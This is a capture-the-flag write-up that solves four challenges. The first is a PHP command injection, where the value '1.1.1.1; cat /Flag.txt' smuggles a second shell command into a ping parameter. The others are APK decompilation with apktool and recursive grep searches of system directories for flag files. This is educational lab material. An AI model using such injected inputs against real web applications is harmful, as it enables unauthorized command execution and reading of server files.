# Ryan CTF: Advanced

### Input Validation

This is a simple command injection, the php is executing the line `exec("ping -c 4 " . $_GET["ip"], $out);`, with the `GET` parameter `ip` that we control.
This way, similarly to SQL injection, we can end the `ping` command with a semicolon `;` (in linux) and the write the second command afterwards. 
Let's try to give the input `1.1.1.1; cat /Flag.txt`, we get 

```
PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data. 
64 bytes from 1.1.1.1: icmp_seq=1 ttl=55 time=13.0 ms 
64 bytes from 1.1.1.1: icmp_seq=2 ttl=55 time=12.3 ms 
64 bytes from 1.1.1.1: icmp_seq=3 ttl=55 time=12.2 ms 
64 bytes from 1.1.1.1: icmp_seq=4 ttl=55 time=12.3 ms 

--- 1.1.1.1 ping statistics --- 
4 packets transmitted, 4 received, 0% packet loss, time 3003ms 
rtt min/avg/max/mdev = 12.253/12.502/13.068/0.338 ms 
Flag: pluripresence 
```


### These are not the droids...

We can decompile the APK with `apktool d` command, then navigate to `smali`, `yanl`, `helloworld`, which seems to be the path to the source code.
We have a few class files in there, let's do a `grep -ri "flag" .` just to make sure.
And yes, we've got the string `./BuildConfig.smali:.field public static final FLAG:Ljava/lang/String; = "FLAG: harmonograph"`


### Find the Flag(.txt)

Looks like we don't directly have access to `find` or other commands, which may be sad, but what we have is `/bin/grep` and it can do a lot of useful stuff.
Let's do a `/bin/grep -ri "flag"` on directories starting from `/`. First, do a `/bin/ls /` to see what dirs we have and try each one.
After a few searches `/bin/grep -ri "flag" /lib` gives us the line `/lib/x86_x64-linux-gnu/security/Flag.txt:FLAG: minuend`

### Find the Flag(.txt) Again
The same trick works for the second challenge and we find the flag in the `etc` folder
`/etc/go/ing/down/the/rabbit/hole/to/find/the/flag/Flag.txt:FLAG: muntjac`